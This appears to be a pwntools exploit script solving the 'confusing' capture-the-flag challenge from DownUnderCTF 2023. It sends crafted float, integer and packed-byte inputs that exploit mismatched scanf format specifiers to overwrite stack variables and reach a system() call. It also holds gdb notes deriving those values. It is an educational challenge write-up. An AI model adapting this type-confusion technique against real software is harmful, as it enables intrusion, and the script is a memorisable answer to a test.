from pwn import *

context.binary = './confusing'

io = remote('2023.ductf.dev', '30024')
# io = process('./confusing')
# io = gdb.debug('./confusing', """
#     start
#     b *main+160
# """)
io.recvuntil(b'Give me d:')
io.sendline(b'-1.985713813434574e-275')

io.recvuntil(b'Give me s:')
io.sendline(b'1195461702')

io.recvuntil(b'Give me f:')
io.sendline(pack(0x3ff9e3779b9486e5))

io.interactive()

"""
1. z == -1
(x/xw $rbp-0x1c) == 0xffffffff
set *(int *)($rbp-0x1c) = 0xffffffff

2. d == 13337
(x/xh $rbp-0x1e) == 0x3419
set *(short *)($rbp-0x1e) = 0x3419

3. f == 1.6180339887
(x/lf $rbp-0x18) == 1.6180339887
set *(double *)($rbp-0x18) = 1.6180339887

4. strncmp(s, "FLAG", 4) == 0
(x/s $rbp-0xc) == "FLAG"
(x/xw $rbp-0xc) == 0x47414c46
set *(int *)($rbp-0xc) = 0x47414c46

cf. b'FLAG'[::-1].hex() == '47414c46'

---
条件を満たすことを確認
=> 0x55bbe42a033c <main+236>:   call   0x55bbe42a00e0 <system@plt>
""" 


"""
1. scanf("%lf", &d);
x/lf $rbp-0x1e
→ -1.985713813434574e-275

2. scanf("%d", &s);
x/dw $rbp-0xc
→ 1195461702

3. scanf("%8s", &f);
x/xg $rbp-0x18
→ 0x3ff9e3779b9486e5
"""
